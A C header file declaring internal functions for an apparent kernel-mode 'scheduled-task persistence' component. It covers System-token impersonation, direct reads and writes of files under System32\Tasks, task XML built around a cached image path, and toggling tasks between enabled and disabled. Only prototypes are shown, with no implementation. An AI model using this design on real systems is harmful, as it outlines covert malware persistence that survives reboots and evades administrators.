#pragma once

//
// Internal cross-module prototypes for the scheduled-task persistence
// pipeline. Public surface (Dispatch-facing) stays in TaskPersistence.h.
//

#include "TaskCompat.h"

// TaskUtils.c
ULONG WStrLen(PCWSTR s);
LONG FindWStr(PCWSTR hay, ULONG hayLen, PCWSTR needle);
PVOID ResolveExportByWChar(PCWSTR name);

// TaskImpersonate.c - run file operations as the System process token.
NTSTATUS TaskImpersonateSystem(PHANDLE tokenOut);
VOID TaskRevertImpersonation(HANDLE token);

// TaskFile.c - \SystemRoot\System32\Tasks read/write behind impersonation.
NTSTATUS TaskReadTaskFile(PWCHAR *outBuffer, ULONG *outByteLen);
NTSTATUS TaskWriteTaskFile(PWCHAR buffer, ULONG byteLen);

// TaskPath.c - \Device\HarddiskVolumeN\... -> C:\...
NTSTATUS TaskImagePathToDos(PUNICODE_STRING imagePath, PUNICODE_STRING outPath);

// TaskXml.c - XML build, image-path cache, enabled<->disabled rewrite.
NTSTATUS TaskSetImagePathCache(PWCHAR path, ULONG charCount);
NTSTATUS TaskBuildTaskXml(PWCHAR xml, ULONG xmlCapacityChars,
                          PULONG charCount, BOOLEAN enabled);
NTSTATUS TaskCreateTaskFile(BOOLEAN enabled);
BOOLEAN TaskBufferIsEnabled(PWCHAR text, ULONG charCount);
NTSTATUS TaskFlipEnabledTags(PWCHAR text, ULONG charCount, BOOLEAN toEnabled,
                             PWCHAR *outBuffer, ULONG *outByteLen);